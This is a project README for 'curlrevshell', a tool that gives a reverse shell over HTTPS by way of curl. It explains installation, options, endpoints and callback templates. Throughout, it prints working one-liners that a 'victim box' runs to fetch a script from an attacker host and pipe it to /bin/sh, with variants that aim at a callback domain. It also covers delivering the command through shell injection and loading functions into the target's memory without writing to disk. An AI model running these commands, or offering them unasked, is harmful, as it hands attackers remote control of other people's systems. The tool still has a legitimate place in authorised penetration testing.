cURL-Powered Reverse Shell
==========================
Somewhat kooky replacement for the typical `bash >/dev/tcp...` reverse shell,
but with the following "features":

- Underlying comms via HTTPS via double cURL
- Self-signed TLS certificate, plus certificate pinning
- Optionally serves static files
- Accepts multiple shells in series, like `nc -lk` but in color
- IPv6-ready
- Logged [feature creep](./doc/changelog.md)
- Non-zero [documentation](./doc/README.md)
- Makefiles which coldheartedly assume
  [BSD Make](https://man.openbsd.org/make)
- Easyish in-target-memory [shell function sender](./doc/flags.md#-ctrl-i)
- Other [tool~s~](./doc/tools.md)

For legal use only.

Quickstart
----------
1. Install the Go compiler (https://go.dev/doc/install).
2. Install `curlrevshell` and start it.
   ```sh
   go install github.com/magisterquis/curlrevshell@sendscript
   curlrevshell
   ```
3. Get a shell, using one of the lines under `To get a shell:`.

There are a few options, try `-h` for a list.

Example
-------
It should look like the following, but with nicer colors:
```
$ go install github.com/magisterquis/curlrevshell@sendscript
go: downloading golang.org/x/sync v0.7.0
go: downloading github.com/magisterquis/goxterm v0.0.1-beta.2
go: downloading golang.org/x/net v0.27.0
go: downloading golang.org/x/tools v0.23.0
go: downloading golang.org/x/exp v0.0.0-20240719175910-8a7402abbf56
go: downloading golang.org/x/sys v0.22.0
go: downloading golang.org/x/text v0.16.0

$ curlrevshell
01:04:42.760 Listening on 0.0.0.0:4444
01:04:42.760 To get a shell:

curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://192.168.1.10:4444/c | /bin/sh

01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
01:04:55.259 [192.168.1.20] Input connected: ID:1jns1whwi1p1q
01:04:55.259 [192.168.1.20] Output connected: ID:1jns1whwi1p1q
01:04:55.259 [192.168.1.20] Shell is ready to go!
> id
01:05:10.753 uid=1000(you) gid=1000(you) groups=1000(you), 0(wheel), 117(dialer)
```
On `192.168.1.20`, the victim box, somewhere between `01:04:42.760` and `01:04:55.247`:
```sh
curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://192.168.1.10:4444/c | /bin/sh
```

Usage
-----
```
Usage: curlrevshell [options]

Even worse reverse shell, powered by cURL.

Keyboard Shortcuts:
Ctrl+O - Mute output for a couple of seconds (for if you cat a huge file)

Options:
  -callback-address address
    	Additional callback address or domain, for one-liner printing (may be repeated)
  -callback-template template
    	Optional callback template file, used if it exists
  -ctrl-i source
    	Tab/Ctrl+I's insertion source file or directory
  -icanhazip
    	Query icanhazip.com for a callback address
  -ipv6-one-liners
    	Also print callback one-liners with IPv6 addresses
  -listen-address address
    	Listen address (default "0.0.0.0:4444")
  -log file
    	Optional file to which to write JSON logs
  -no-timestamps
    	Don't print timestamps
  -one-shell
    	Close listening socket when first shell connects
  -print-default-template
    	Write the default template to stdout and exit
  -prompt string
    	Terminal prompt; don't forget a trailing space (default "> ")
  -serve-files-from directory
    	Optional directory from which to serve static files
  -tls-certificate-cache file
    	Optional file in which to cache generated TLS certificate (default "/home/stuart/.cache/sstls/cert.txtar")
```

Details
-------
Under the hood, it's really just a little HTTP server with four endpoints:

Endpoint          | Description
------------------|------------
`/i/{id}`         | Long-lived connection for input from you to the shell.
`/o/{id}`         | Output from the shell to you, one line at a time.  The `{id}` has to match `/i`'s.
`/c`              | Serves up a little script that takes the place of `bash >/dev/tcp...` and makes you appreciate low PIDs.
`/{anythingelse}` | Either serves up files or 404's if nobody gave it `-serve-files-from` (which doesn't actually have to be a directory).

Callback Template
-----------------
The script generated with `/c` can be changed by writing a new template and
telling the program about it with `-print-default-template`.  It usually looks
like
```sh
$ curlrevshell -print-default-template >custom.tmpl # Get the default template to start with
$ vim ./custom.tmpl                                 # Mod ALL the things!
$ curlrevshell -callback-template ./custom.tmpl     # Run with your fancy new template
```
The struct passed to the template is `TemplateParams` in
[script.go](internal/hsrv/script.go).  The default template is
[script.tmpl](internal/hsrv/script.tmpl).  It's re-read every time it's needed,
so feel free to change it as often as you'd like.

A script to generate a custom callback template with embedded shell functions
can be made with `make tools/funcgen` and is found in `tools/funcgen`.

On Linux, you'll probably need BSD make(`apt/yum/such install bmake`, or
thereabouts) and add a `b` before the `make`s.

Callback Address
----------------
Most of the time if you can connect to the server to grab a script (i.e. `/c`)
the server will work out the right callback address.  Most of the time.  For
those times which aren't Most, giving a URL with either a `c2` parameter to `/c`
or a `c2:` header should clear things up.  This is clearer with an example:

### As a URL parameter
The Request for a script:
```sh
curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://192.168.1.10:4444/c?c2=kittens.com'
```
The `curl` command in the script:
```sh
curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com/i/1upal29kpq9g7 </dev/null 2>&0 |
```
With `?c2=kittens.com` it would have been `https://192.168.1.10:4444` instead.

The server also tells us that the script was generated for `kittens.com`:
```
22:08:20.488 [192.168.1.20] Sent script: ID:1upal29kpq9g7 URL:kittens.com
```

### As a header
Sometimes it's a pain to put `?` and such in shell injection.  Headers are
easier.  We'll also add a port this time.
```sh
curl -Hc2:kittens.com:22 -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://192.168.1.10:4444/c
```
Weird flex, but it worked.
```sh
curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com:22/i/2v0ohzqf5kw1t </dev/null 2>&0 |
```
Server agrees
```
22:14:13.902 [192.168.1.20] Sent script: ID:2v0ohzqf5kw1t URL:kittens.com:22
```

TLS
---
TLS is all via a pinned self-signed certificate.  By default, the certificate
is cached in a file, mostly to keep from having to copy/paste a new fingerprint
every time a ragey Ctrl+C kills the current shell.  Caching can be disabled
with `-tls-certificate-cache ""`.

File Insertion
--------------
It's kinda nice to bring your own functions, even nicer to not have to
drop them to disk, and even nice still to not have to copy/paste a few hundred
lines of shell script by hand.

Works with single files, Perl scripts, and even entire directories.

More info in [the docs](./doc/flags.md#-ctrl-i).
